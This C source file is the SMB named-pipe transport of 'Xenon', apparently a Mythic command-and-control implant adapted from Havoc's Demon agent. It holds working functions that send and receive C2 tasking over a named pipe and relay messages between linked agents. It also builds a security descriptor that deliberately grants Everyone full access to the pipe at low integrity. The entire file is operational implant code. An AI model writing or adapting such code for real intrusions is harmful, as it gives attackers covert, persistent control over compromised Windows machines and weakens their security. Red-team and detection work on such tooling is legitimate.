/*
	SMB Named pipe comms
*/

#include "TransportSmb.h"

#include "Xenon.h"
#include "Config.h"
#include "Package.h"

/* This file is the the Mythic SMB profile */
#ifdef SMB_TRANSPORT

/**
 * @brief Send data to SMB C2 Channel
 * 
 * @ref https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/TransportSmb.c
 * 
 * @note For SMB agents acting as links, SmbId MUST match the LinkId that the
 *       main agent expects. This ensures LinkPush() can properly verify messages.
 *       All packages sent by SMB agents (including queued chunks from Download, etc.)
 *       will have SmbId prepended via this function.
 * 
 * @return BOOL  
 */
BOOL SmbSend(PPackage package)
{
	BOOL   Success = FALSE;

    /* Prepend P2P Linking ID to Package
     * This SmbId is used by the receiving agent (via LinkPush) to verify
     * that the message came from the correct linked agent */
    PPackage Send = PackageInit(NULL, FALSE);
    PackageAddInt32(Send, xenonConfig->SmbId);
    PackageAddBytes(Send, package->buffer, package->length, FALSE);

    _dbg("[SMB Comms] Sending msg with %d bytes : LinkId [%x]", Send->length, xenonConfig->SmbId);

	/* Not initialized Yet */
	if ( !xenonConfig->SmbPipe )
	{
		SMB_PIPE_SEC_ATTR   SmbSecAttr   = { 0 };
		SECURITY_ATTRIBUTES SecurityAttr = { 0 };

		SmbSecurityAttrOpen( &SmbSecAttr, &SecurityAttr );

		xenonConfig->SmbPipe = CreateNamedPipeA(
				xenonConfig->SmbPipename,		 // Named pipe string
				PIPE_ACCESS_DUPLEX,              // read/write access
				PIPE_TYPE_MESSAGE     |          // message type pipe
				PIPE_READMODE_MESSAGE |          // message-read mode
				PIPE_WAIT,                       // blocking mode
				PIPE_UNLIMITED_INSTANCES,        // max. instances
				PIPE_BUFFER_MAX,                 // output buffer size
				PIPE_BUFFER_MAX,                 // input buffer size
				0,                               // client time-out
				&SecurityAttr 					 // security attributes
			);
		
		SmbSecurityAttrFree( &SmbSecAttr );

		if ( !xenonConfig->SmbPipe )
			goto END;


		if ( !ConnectNamedPipe(xenonConfig->SmbPipe, NULL) )
		{
			CloseHandle(xenonConfig->SmbPipe);
			goto END;
		}

		/* Send the message to the named pipe */
		if ( !PackageSendPipe(xenonConfig->SmbPipe, Send->buffer, Send->length) ) {
            _err("Failed to send msg to pipe. ERROR : %d ", GetLastError());
        }

        /* Skip to end */
        goto END;
	}

	/* Send if pipe is already initialized */
	if ( !PackageSendPipe(xenonConfig->SmbPipe, Send->buffer, Send->length) )
	{
        DWORD error = GetLastError();
        /* Means that the client disconnected/the pipe is closing. */
		if ( error == ERROR_NO_DATA )
		{
			if ( xenonConfig->SmbPipe ) 
            {
				CloseHandle(xenonConfig->SmbPipe);
                xenonConfig->SmbPipe = NULL;
				goto END;
			}
		}
        if ( error == ERROR_INVALID_HANDLE )
        {
            _err("INVALID_HANDLE");
            goto END;
        }
	}

	Success = TRUE;

END:
    PackageDestroy(Send);
	return Success;
}




/**
 * @brief Read data from SMB C2 Channel
 * 
 * @ref https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/TransportSmb.c#L65
 * @return BOOL  
 */
BOOL SmbRecieve(PBYTE* ppOutData, SIZE_T* pOutLen)
{
    DWORD BytesSize   = 0;
    DWORD BytesRead   = 0;
    DWORD PackageSize = 0;
    DWORD Total       = 0;
    PVOID Buffer      = NULL;

    if ( PeekNamedPipe( xenonConfig->SmbPipe, NULL, 0, NULL, &PackageSize, NULL ) )
    {
        _dbg("PeekNamedPipe found: %d bytes", PackageSize);

        if ( PackageSize > sizeof(TASK_UUID_SIZE))
        {
            /* Dynamically allocated to handle any size */
            Buffer = LocalAlloc(LPTR, PackageSize);

            /* Try to read the whole message */
            do {
                if ( !ReadFile(xenonConfig->SmbPipe, (Buffer + Total), MIN((PackageSize - Total), PIPE_BUFFER_MAX), &BytesRead, NULL) ) 
                {
                    if ( GetLastError() != ERROR_MORE_DATA ) 
                    {
                        _err("ReadFile failed with %d", GetLastError());
                        LocalFree(Buffer);
                        *ppOutData  = NULL;
                        *pOutLen    = 0;
                        return FALSE;
                    }
                }

                Total += BytesRead;
            } while ( Total < PackageSize );
            
            /* Output */
            *ppOutData = Buffer;
            *pOutLen = PackageSize;

        }
        else if ( PackageSize > 0 )
        {
            _err("Data in the pipe is too small: %d bytes", PackageSize);
        }
        else
        {
            // Nothing in the pipe
        }
    }
    else
    {
        /* We disconnected */
        _err("PeekNamedPipe failed with %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}


/**
 * @brief Initialize Security Descriptor to allow anyone to connect to namedpipe
 */
VOID SmbSecurityAttrOpen( PSMB_PIPE_SEC_ATTR SmbSecAttr, PSECURITY_ATTRIBUTES SecurityAttr )
{
    SID_IDENTIFIER_AUTHORITY SidIdAuth      = SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY SidLabel       = SECURITY_MANDATORY_LABEL_AUTHORITY;
    EXPLICIT_ACCESSA         ExplicitAccess = { 0 };
    DWORD                    Result         = 0;
    PACL                     DAcl           = NULL;
    /* zero them out. */
    memset(SmbSecAttr, 0, sizeof(SMB_PIPE_SEC_ATTR));
    memset(SecurityAttr, 0, sizeof(PSECURITY_ATTRIBUTES));

    if ( !AllocateAndInitializeSid(&SidIdAuth, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &SmbSecAttr->Sid) )
    {
        _err( "AllocateAndInitializeSid failed: %u\n", GetLastError() );
        return;
    }
    _dbg( "SmbSecAttr->Sid: %p\n", SmbSecAttr->Sid );

    ExplicitAccess.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
    ExplicitAccess.grfAccessMode        = SET_ACCESS;
    ExplicitAccess.grfInheritance       = NO_INHERITANCE;
    ExplicitAccess.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ExplicitAccess.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ExplicitAccess.Trustee.ptstrName    = SmbSecAttr->Sid;

    Result = SetEntriesInAclA( 1, &ExplicitAccess, NULL, &DAcl );
    if ( Result != ERROR_SUCCESS )
    {
        _err( "SetEntriesInAclW failed: %u\n", Result );
    }
    _dbg( "DACL: %p\n", DAcl );

    if ( !AllocateAndInitializeSid( &SidLabel, 1, SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0, 0, 0, 0, &SmbSecAttr->SidLow ) )
    {
        _err( "AllocateAndInitializeSid failed: %u\n", GetLastError() );
    }
    _dbg( "sidLow: %p\n", SmbSecAttr->SidLow );

    SmbSecAttr->SAcl = malloc( MAX_PATH );
    if ( !InitializeAcl( SmbSecAttr->SAcl, MAX_PATH, ACL_REVISION_DS ) )
    {
        _err( "InitializeAcl failed: %u\n", GetLastError() );
    }

    if ( !AddMandatoryAce( SmbSecAttr->SAcl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->SidLow ) )
    {
        _err( "AddMandatoryAce failed: %u\n", GetLastError() );
    }

    // now build the descriptor
    SmbSecAttr->SecDec = malloc( SECURITY_DESCRIPTOR_MIN_LENGTH );
    if ( !InitializeSecurityDescriptor( SmbSecAttr->SecDec, SECURITY_DESCRIPTOR_REVISION ) )
    {
        _err( "InitializeSecurityDescriptor failed: %u\n", GetLastError() );
    }

    if ( !SetSecurityDescriptorDacl( SmbSecAttr->SecDec, TRUE, DAcl, FALSE ) )
    {
        _err( "SetSecurityDescriptorDacl failed: %u\n", GetLastError() );
    }

    if ( !SetSecurityDescriptorSacl( SmbSecAttr->SecDec, TRUE, SmbSecAttr->SAcl, FALSE ) )
    {
        _err( "SetSecurityDescriptorSacl failed: %u\n", GetLastError() );
    }

    SecurityAttr->lpSecurityDescriptor = SmbSecAttr->SecDec;
    SecurityAttr->bInheritHandle       = FALSE;
    SecurityAttr->nLength              = sizeof( SECURITY_ATTRIBUTES );
}

/**
 * @brief Free the allocated memory for Security Descriptor
 */
VOID SmbSecurityAttrFree( PSMB_PIPE_SEC_ATTR SmbSecAttr )
{
    if ( SmbSecAttr->Sid )
    {
        FreeSid( SmbSecAttr->Sid );
        SmbSecAttr->Sid = NULL;
    }

    if ( SmbSecAttr->SidLow )
    {
        FreeSid( SmbSecAttr->SidLow );
        SmbSecAttr->SidLow = NULL;
    }

    if ( SmbSecAttr->SAcl )
    {
        free( SmbSecAttr->SAcl );
        SmbSecAttr->SAcl = NULL;
    }

    if ( SmbSecAttr->SecDec )
    {
        free( SmbSecAttr->SecDec );
        SmbSecAttr->SecDec = NULL;
    }
}

#endif // SMB_TRANSPORT
